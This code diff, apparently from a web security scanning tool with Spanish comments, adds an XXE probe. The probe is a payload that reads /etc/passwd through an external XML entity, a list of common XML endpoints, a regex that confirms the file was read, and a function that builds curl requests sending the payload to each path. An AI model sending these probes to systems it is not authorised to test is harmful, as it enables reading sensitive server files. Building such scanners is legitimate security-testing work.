@@ -1210,6 +1210,40 @@ export function waybackOsintSteps(step, root) {
 }
 
 /* ------------------------------------------------------------------------ *
+ * XXE (XML External Entity) genérico: mismo criterio que SSTI — un solo
+ * payload curado, confirmación solo si el efecto real ocurrió (aquí,
+ * lectura de fichero local), no un eco ciego del payload sin evaluar.
+ * Rutas típicas que aceptan XML: SOAP, APIs REST que también aceptan
+ * application/xml además de JSON, endpoints de importación/upload.
+ * https://hacktricks.wiki/en/pentesting-web/xxe-xml-external-entity.html
+ * ------------------------------------------------------------------------ */
+export const XXE_PAYLOAD =
+  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
+export const XXE_PATHS = [
+  "/", "/api", "/api/xml", "/soap", "/xmlrpc.php", "/upload", "/import",
+];
+
+const XXE_CONFIRMED_RE = /root:.*:0:0:/;
+
+/** true si la respuesta refleja /etc/passwd real (lectura de fichero confirmada, no eco ciego). */
+export function xxeConfirmed(text) {
+  return XXE_CONFIRMED_RE.test(String(text || ""));
+}
+
+export function xxeCurlSteps(step, prefix, baseUrl, maxTime = "12") {
+  return XXE_PATHS.map((path, i) =>
+    step(`${prefix}-${i + 1}`, "curl", [
+      "-s", "-L", "--max-time", maxTime,
+      "-H", "Content-Type: application/xml",
+      "--data-binary", XXE_PAYLOAD,
+      baseUrl + path,
+    ], null, {
+      desc: `Sonda de XXE genérico: ${path}`,
+    }),
+  );
+}
+
+/* ------------------------------------------------------------------------ *
  * Código fuente: secretos hardcodeados en bundles JS ya servidos por la
  * app (SPA React/Vue/Angular). Puramente pasivo: solo analiza texto de
  * ficheros que la propia app expone públicamente.
